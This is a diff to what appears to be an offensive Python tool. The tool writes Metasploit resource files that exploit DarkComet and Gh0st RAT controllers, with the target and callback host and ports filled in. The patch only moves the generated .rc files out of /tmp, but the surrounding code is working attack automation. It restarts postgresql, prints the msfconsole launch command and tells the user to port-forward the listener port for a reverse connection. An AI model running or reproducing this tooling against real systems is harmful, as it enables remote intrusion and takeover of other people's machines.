@@ -86,11 +86,11 @@ set LHOST %s
 exploit
             """%(IP, PORT, LIP))
 
-            with open("/tmp/DarkComet_Metasploit.rc", "w+") as file:
+            with open("DarkComet_Metasploit.rc", "w+") as file:
                 file.write(payload_comm)
             print("\n\tNew Metasploit rc File Written To DarkComet_Metasploit.rc")
             os.system("service postgresql restart")
-            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r /tmp/DarkComet_Metasploit.r ")
+            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r DarkComet_Metasploit.r ")
             sleep(7)
         ## Gh0st rc choice-1
         if name == 'gh0st':
@@ -103,11 +103,11 @@ set RPORT %s
 set LPORT %s
 exploit
             """%(IP, PORT, LPORT))
-            with open("/tmp/GhostRat_Metasploit.rc", "w+") as file:
+            with open("GhostRat_Metasploit.rc", "w+") as file:
                 file.write(payload_comm)
-            print("\n\tNew Metasploit rc File Written To /tmp/GhostRat_Metasploit.rc")
+            print("\n\tNew Metasploit rc File Written To GhostRat_Metasploit.rc")
             os.system("service postgresql restart")
-            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r /tmp/GhostRat_Metasploit.rc")
+            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r GhostRat_Metasploit.rc")
             print("\n\tRemember if you are behind nat to port forward port %s"%(LPORT))
             sleep(7)
 
@@ -136,11 +136,11 @@ set LHOST %s
 exploit
             """%(IP, PORT, LIP))
 
-            with open("/tmp/DarkComet_Metasploit.rc", "w+") as file:
+            with open("DarkComet_Metasploit.rc", "w+") as file:
                 file.write(payload_comm)
-            print("\n\tNew Metasploit rc File Written To /tmp/DarkComet_Metasploit.rc")
+            print("\n\tNew Metasploit rc File Written To DarkComet_Metasploit.rc")
             os.system("service postgresql restart")
-            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r /tmp/DarkComet_Metasploit.rc")
+            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r DarkComet_Metasploit.rc")
             sleep(7)
 
         ## gh0st rc choice-2
@@ -154,11 +154,11 @@ set RPORT %s
 set LPORT %s
 exploit
             """%(IP, PORT, LPORT))
-            with open("/tmp/GhostRat_Metasploit.rc", "w+") as file:
+            with open("GhostRat_Metasploit.rc", "w+") as file:
                 file.write(payload_comm)
-            print("\n\tNew Metasploit rc File Written To /tmp/GhostRat_Metasploit.rc")
+            print("\n\tNew Metasploit rc File Written To GhostRat_Metasploit.rc")
             os.system("service postgresql restart")
-            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r /tmp/GhostRat_Metasploit.rc")
+            print("\n\n\t[#]Now You Can Launch The Exploit With, msfconsole -r GhostRat_Metasploit.rc")
             print("\n\tRemember if you are behind nat to port forward port %s"%(LPORT))
             sleep(7)
 
